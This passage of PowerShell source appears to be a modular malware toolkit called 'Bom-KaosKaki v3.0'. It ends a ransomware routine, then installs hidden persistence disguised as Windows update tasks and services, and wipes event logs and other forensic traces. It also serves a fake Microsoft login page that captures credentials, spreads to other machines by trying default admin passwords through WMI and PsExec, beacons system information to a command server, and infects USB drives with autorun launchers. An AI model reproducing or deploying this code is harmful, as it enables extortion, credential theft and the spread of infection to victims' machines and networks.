        catch {
            @{ status = 'error'; file = $file.FullName }
        }
    }
    
    $successes = @($results | Where-Object { $_.status -eq 'success' })
    if ($successes) { $encryptedCount = $successes.Count }
    $failedFiles = @($results | Where-Object { $_.status -eq 'error' } | Select-Object -ExpandProperty file)
    
    # === FIX: If too many failures, rollback ===
    if ($failedFiles.Count -gt $allFiles.Count * 0.5) {
        Write-Log "[RANSOMWARE] Critical failure rate! Rolling back..."
        # Delete partial encrypted files
        foreach ($file in $allFiles) {
            $encPath = $file.FullName + ".ransim"
            if (Test-Path $encPath) { Remove-Item $encPath -Force -EA 0 }
        }
        Invoke-C2 ransomware_status @{status = 'rollback'; error = 'high_failure_rate'; files_encrypted = 0 }
        return
    }
    
    # Ransom note (sama seperti sebelumnya)
    $note = "..."
    foreach ($dir in $targetDirs) { if (Test-Path $dir) { $note | Out-File "$dir\RANSOM_NOTE.txt" -Encoding ascii -EA 0 } }
    
    # === FIX: Hide backup file ===
    Set-ItemProperty $backupDir -Name Attributes -Value 'Hidden' -EA 0
    
    Write-Log "[RANSOMWARE] Encrypted $encryptedCount files"
    Invoke-C2 ransomware_status @{files_encrypted = $encryptedCount; session = $SESSION_ID; backup_file = $backupFile }
}

# ========== MODULE 10: PERSISTENCE ENGINE ==========
function Invoke-Persistence {
    Write-Log "[PERSISTENCE] Installing persistence mechanisms..."
  
    $psPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ransim.lnk"
  
    # 10.1 Run Key
    try {
        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $psPath -PropertyType String -Force -ErrorAction SilentlyContinue
        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $psPath -PropertyType String -Force -ErrorAction SilentlyContinue
        Write-Log "[PERSISTENCE] Run Key added"
    }
    catch {}
  
    # 10.2 Scheduled Task (with trigger on startup + every hour)
    try {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
        $triggers = @(
            New-ScheduledTaskTrigger -AtStartup
            New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1).ToString('HH:mm') -RepetitionInterval (New-TimeSpan -Hours 1)
        )
        Register-ScheduledTask -TaskName 'MicrosoftWindowsUpdateCheck' -Action $action -Trigger $triggers -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Log "[PERSISTENCE] Scheduled Task created"
    }
    catch {}
  
    # 10.3 Startup Folder Shortcut
    try {
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = 'powershell.exe'
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
        $shortcut.WindowStyle = 7
        $shortcut.Save()
        Write-Log "[PERSISTENCE] Startup shortcut created"
    }
    catch {}
  
    # 10.4 WMI Event Subscription (permanent)
    try {
        $filterName = 'WindowsHealthFilter'
        $consumerName = 'WindowsHealthConsumer'
    
        # Remove existing if any
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __EventConsumer -Filter "Name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter -match $filterName } | Remove-WmiObject -ErrorAction SilentlyContinue
    
        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
            Name           = $filterName
            EventNamespace = 'root\cimv2'
            QueryLanguage  = 'WQL'
            Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        } -ErrorAction SilentlyContinue
    
        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
            Name                = $consumerName
            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
            RunInteractively    = $false
        } -ErrorAction SilentlyContinue
    
        if ($filter -and $consumer) {
            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
                Filter   = $filter
                Consumer = $consumer
            } -ErrorAction SilentlyContinue
            Write-Log "[PERSISTENCE] WMI Event Subscription created"
        }
    }
    catch {}
  
    # 10.5 Service Persistence
    try {
        $serviceName = 'WindowsHealthService'
        $binaryPath = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Full"
        New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName 'Windows Health Service' -Description 'Monitors system health and performance' -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service $serviceName -ErrorAction SilentlyContinue
        Write-Log "[PERSISTENCE] Service created"
    }
    catch {}
  
    # 10.6 Copy script to hidden location
    try {
        $hiddenDir = "$env:APPDATA\Microsoft\Windows\UpdateCache"
        if (!(Test-Path $hiddenDir)) { New-Item -Path $hiddenDir -ItemType Directory -Force -Hidden | Out-Null }
        Copy-Item $PSCommandPath "$hiddenDir\update.ps1" -Force
        Set-ItemProperty "$hiddenDir" -Name Attributes -Value 'Hidden'
        Write-Log "[PERSISTENCE] Script copied to hidden location"
    }
    catch {}
  
    Write-Log "[PERSISTENCE] All persistence mechanisms installed"
}

# ========== MODULE 11: LOG CLEANER ==========
function Invoke-LogCleaner {
    Write-Log "[CLEANER] Cleaning forensic traces..."
  
    # 11.1 Clear PowerShell History
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\*" -Force -ErrorAction SilentlyContinue
    }
    catch {}
  
    # 11.2 Clear Event Logs
    try {
        $logs = @('Security', 'System', 'Application', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TaskScheduler/Operational')
        foreach ($log in $logs) {
            try {
                Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
                wevtutil cl $log 2>$null
            }
            catch {}
        }
        Write-Log "[CLEANER] Event logs cleared"
    }
    catch {}
  
    # 11.3 Delete Prefetch
    try {
        Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
        Write-Log "[CLEANER] Prefetch cleared"
    }
    catch {}
  
    # 11.4 Clear Temp Files
    try {
        $tempPaths = @("$env:TEMP\*", "$env:WINDIR\Temp\*", "$env:USERPROFILE\AppData\Local\Temp\*")
        foreach ($path in $tempPaths) {
            Remove-Item $path -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-Log "[CLEANER] Temp files cleared"
    }
    catch {}
  
    # 11.5 Clear USN Journal (if admin)
    try {
        fsutil usn deletejournal /d C: 2>$null
        Write-Log "[CLEANER] USN Journal cleared"
    }
    catch {}
  
    # 11.6 Clear Clipboard
    try {
        Add-Type -AssemblyName System.Windows.Forms
        [System.Windows.Forms.Clipboard]::Clear()
        Write-Log "[CLEANER] Clipboard cleared"
    }
    catch {}
  
    # 11.7 Clear Recent Documents
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force -ErrorAction SilentlyContinue
        Write-Log "[CLEANER] Recent documents cleared"
    }
    catch {}
  
    # 11.8 Clear Jump Lists
    try {
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*" -Force -ErrorAction SilentlyContinue
        Write-Log "[CLEANER] Jump lists cleared"
    }
    catch {}
  
    # 11.9 Clear DNS Cache
    try {
        ipconfig /flushdns 2>$null
        Write-Log "[CLEANER] DNS cache flushed"
    }
    catch {}
  
    Write-Log "[CLEANER] Forensic cleanup complete"
}

# ========== MODULE 12: PHISHING ENGINE ==========
function Invoke-Phishing {
    Write-Log "[PHISHING] Starting phishing server..."
  
    $phishingHtml = @'
<!DOCTYPE html>
<html>
<head>
  <title>Microsoft Sign In</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-container { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; width: 360px; text-align: center; }
    .logo { margin-bottom: 20px; }
    .logo svg { width: 120px; }
    h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #1b1b1b; }
    p { color: #666; font-size: 14px; margin-bottom: 20px; }
    input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 15px; outline: none; }
    input:focus { border-color: #0067b8; }
    button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 600; }
    button:hover { background: #005da6; }
    .error { color: #e81123; font-size: 12px; margin-top: 10px; display: none; }
    .footer { margin-top: 20px; font-size: 12px; color: #999; }
    .footer a { color: #0067b8; text-decoration: none; }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg"><rect x="1" y="1" width="9" height="9" fill="#f25022"/><rect x="11" y="1" width="9" height="9" fill="#7fba00"/><rect x="1" y="11" width="9" height="9" fill="#00a4ef"/><rect x="11" y="11" width="9" height="9" fill="#ffb900"/></svg>
    </div>
    <h1>Sign in</h1>
    <p>to continue to Microsoft services</p>
    <form id="loginForm" action="/api/exfil" method="POST">
      <input type="hidden" name="type" value="phishing">
      <input type="hidden" name="session_id" value="' + $SESSION_ID + '">
      <input type="email" name="username" placeholder="Email, phone, or Skype" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Sign in</button>
      <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
    </form>
    <div class="footer">
      <a href="#">Forgot password?</a> | <a href="#">Create account</a>
    </div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      const data = {};
      formData.forEach((v, k) => data[k] = v);
      
      try {
        await fetch('/api/exfil', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(data)
        });
        document.getElementById('errorMsg').style.display = 'block';
      } catch(e) {
        document.getElementById('errorMsg').style.display = 'block';
      }
    });
  </script>
</body>
</html>
'@
  
    # Write HTML to temp
    $htmlPath = "$env:TEMP\mslogin.html"
    $phishingHtml | Out-File $htmlPath -Encoding utf8
  
    # Start local HTTP listener on port 8080
    $httpListener = New-Object System.Net.HttpListener
    $httpListener.Prefixes.Add('http://+:8080/')
    $httpListener.Start()
    Write-Log "[PHISHING] HTTP listener started on port 8080"
  
    while ($true) {
        try {
            $context = $httpListener.GetContext()
            $request = $context.Request
            $response = $context.Response
      
            if ($request.HttpMethod -eq 'GET') {
                # Serve phishing page
                $content = [System.Text.Encoding]::UTF8.GetBytes($phishingHtml)
                $response.ContentType = 'text/html; charset=utf-8'
                $response.OutputStream.Write($content, 0, $content.Length)
            }
      
            $response.Close()
        }
        catch { Write-Log "[PHISHING] Error: $_" }
    }
}

# ========== MODULE 13: LATERAL MOVEMENT ==========
function Invoke-LateralMovement {
    Write-Log "[LATERAL] Scanning for lateral movement targets..."
  
    # 13.1 Discover network targets
    $subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq 'Dhcp' -or $_.PrefixOrigin -eq 'Manual' } | Select-Object -First 1).IPAddress
    if ($subnet) {
        $prefix = $subnet.Substring(0, $subnet.LastIndexOf('.'))
        $targets = @()
        1..254 | ForEach-Object -Parallel {
            $ip = "$($using:prefix).$_"
            try {
                if (Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeToLive 128 -ErrorAction SilentlyContinue) {
                    $ip
                }
            }
            catch {}
        } -ThrottleLimit 50 | ForEach-Object { $targets += $_ }
    
        Write-Log "[LATERAL] Found $($targets.Count) live hosts"
    
        $scriptPath = $PSCommandPath
    
        # 13.2 Try common credentials
        $commonCreds = @(
            @{user = 'Administrator'; pass = 'admin' },
            @{user = 'Administrator'; pass = 'password' },
            @{user = 'Administrator'; pass = '123456' },
            @{user = 'Administrator'; pass = 'P@ssw0rd' },
            @{user = 'admin'; pass = 'admin' },
            @{user = 'admin'; pass = 'password' },
            @{user = 'admin'; pass = 'P@ssw0rd' },
            @{user = 'Administrator'; pass = 'Welcome1' },
            @{user = 'Administrator'; pass = 'Welcome123' },
            @{user = 'Administrator'; pass = 'letmein' }
        )
    
        foreach ($target in $targets) {
            foreach ($cred in $commonCreds) {
                try {
                    $secpass = ConvertTo-SecureString $cred.pass -AsPlainText -Force
                    $credObj = New-Object System.Management.Automation.PSCredential($cred.user, $secpass)
          
                    # Test WMI connection
                    $wmiTest = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $target -Credential $credObj -ErrorAction SilentlyContinue
                    if ($wmiTest) {
                        Write-Log "[LATERAL] Connected to $target with $($cred.user):$($cred.pass)"
            
                        # Copy payload via admin share
                        $destination = "\\$target\admin$\Temp\update.ps1"
                        Copy-Item $scriptPath $destination -Force -ErrorAction SilentlyContinue
            
                        # Execute via WMI
                        $wmiProcess = Invoke-WmiMethod -Class Win32_Process -ComputerName $target -Credential $credObj -Name Create -ArgumentList "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full" -ErrorAction SilentlyContinue
                        [void]$wmiProcess
            
                        # Execute via Scheduled Task
                        $taskAction = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full"
                        $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
                        $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
                        Register-ScheduledTask -ComputerName $target -Credential $credObj -TaskName 'MicrosoftUpdateCheck' -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction SilentlyContinue
            
                        # Execute via PsExec (if available)
                        try {
                            Start-Process -FilePath "psexec.exe" -ArgumentList "\\$target -u $($cred.user) -p $($cred.pass) -h -s -d powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full" -WindowStyle Hidden -ErrorAction SilentlyContinue
                        }
                        catch {}
            
                        Invoke-C2 -type 'lateral_movement' -data @{target = $target; user = $cred.user; status = 'deployed' }
                        break
                    }
                }
                catch {}
            }
        }
    }
  
    Write-Log "[LATERAL] Lateral movement complete"
}

# ========== MODULE 14: C2 COMMUNICATION ==========
function Start-C2Communication {
    Write-Log "[C2] Starting heartbeat..."
  
    # 14.1 Send initial heartbeat with system info
    $systemInfo = @{
        hostname  = $env:COMPUTERNAME
        username  = $env:USERNAME
        os        = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
        arch      = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).OSArchitecture
        lang      = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
        upTime    = (Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
        public_ip = $(try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip } catch { 'unknown' })
    }
  
    Invoke-C2 -type 'heartbeat' -data $systemInfo
  
    # 14.2 Heartbeat loop every 60 seconds
    while ($true) {
        Start-Sleep -Seconds 60
        Invoke-C2 -type 'heartbeat' -data @{timestamp = (Get-Date -Format 'o') }
    }
}

# ========== MODULE 15: USB PROPAGATION ==========
function Invoke-USBPropagation {
    Write-Log "[USB] Setting up USB propagation..."
  
    # 15.1 Monitor for USB drives
    $existingDrives = @(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' } | ForEach-Object { $_.Root })
  
    while ($true) {
        Start-Sleep -Seconds 10
        $currentDrives = @(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' } | ForEach-Object { $_.Root })
        $newDrives = $currentDrives | Where-Object { $_ -notin $existingDrives }
    
        foreach ($drive in $newDrives) {
            try {
                # Check if removable
                $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$($drive.Replace('\',''))'" -ErrorAction SilentlyContinue).DriveType
                if ($driveType -eq 2) {
                    # Removable
                    Write-Log "[USB] Found removable drive: $drive"
          
                    # 15.2 Copy payload to USB
                    $usbPath = "$drive"
                    Copy-Item $PSCommandPath "$usbPath\WindowsUpdate.ps1" -Force -ErrorAction SilentlyContinue
          
                    # 15.3 Create autorun.inf
                    $autorun = @"
[AutoRun]
Shellexecute=wscript.exe //nologo "%~dp0launch.vbs"
Action=Open folder to view files
Icon=shell32.dll,4
"@
                    $autorun | Out-File "$usbPath\autorun.inf" -Encoding ascii -Force
          
                    # 15.4 Create VBS launcher (bypasses autorun restrictions on Win 10+)
                    $vbs = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0WindowsUpdate.ps1"" -Full", 0, False
'@
                    $vbs | Out-File "$usbPath\launch.vbs" -Encoding ascii -Force
          
                    # 15.5 Create shortcut with PowerShell execution
                    $WScriptShell = New-Object -ComObject WScript.Shell
                    $shortcut = $WScriptShell.CreateShortcut("$usbPath\WindowsUpdate.lnk")
                    $shortcut.TargetPath = 'powershell.exe'
                    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"%~dp0WindowsUpdate.ps1`" -Full"
                    $shortcut.IconLocation = 'shell32.dll,4'
                    $shortcut.WindowStyle = 7
                    $shortcut.Save()
          
                    # 15.6 Set hidden attributes
                    Set-ItemProperty "$usbPath\autorun.inf" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
                    Set-ItemProperty "$usbPath\launch.vbs" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
                    Set-ItemProperty "$usbPath\WindowsUpdate.ps1" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
                    Set-ItemProperty "$usbPath\WindowsUpdate.lnk" -Name Attributes -Value 'Normal' -ErrorAction SilentlyContinue
          
                    Invoke-C2 -type 'usb_propagation' -data @{drive = $drive; status = 'deployed' }
                    Write-Log "[USB] Deployed to $drive"
                }
            }
            catch { Write-Log "[USB] Error on $drive : $_" }
        }
    
        $existingDrives = $currentDrives
    }
}

# ========== MAIN EXECUTION ==========
function Invoke-Main {
    Write-Log "=== Bom-KaosKaki v3.0 Starting ==="
    Write-Log "Session: $SESSION_ID | Machine: $MACHINE_ID"
  
    # Always run evasion first
    Invoke-Evasion
  
    # Start C2 heartbeat in background
    Start-ThreadJob 'Start-C2Communication'
  
    # Start spyware collection
    Invoke-Spyware
    Invoke-BrowserStealer
    Invoke-WiFiStealer
    Invoke-VpnStealer
  
    # Module selection
    if ($Full -or $Keylogger) {
        Start-ThreadJob 'Invoke-Keylogger'
        Start-ThreadJob 'Invoke-ClipboardMonitor'
        Start-ThreadJob 'Invoke-Screenshot'
    }
  
    if ($Full -or $Ransomware) {
        Invoke-LogCleaner
        Invoke-Ransomware
    }
  
    if ($Full -or $Phishing) {
        Start-ThreadJob 'Invoke-Phishing'
    }
  
    if ($Full -or $Spread) {
        Invoke-LateralMovement
        Start-ThreadJob 'Invoke-USBPropagation'
    }
  
    if ($Full) {
        Invoke-Persistence
    }
  
    # Keep alive for background threads
    while ($true) {
        Start-Sleep -Seconds 10
    }
}

# Run
if (-not $NoMain) {
    try {
        Invoke-Main
    }
    catch {
        Write-Log "[FATAL] $_"
        $_.Exception.ToString() | Out-File "$env:TEMP\ransim_error.log" -Append
    }
}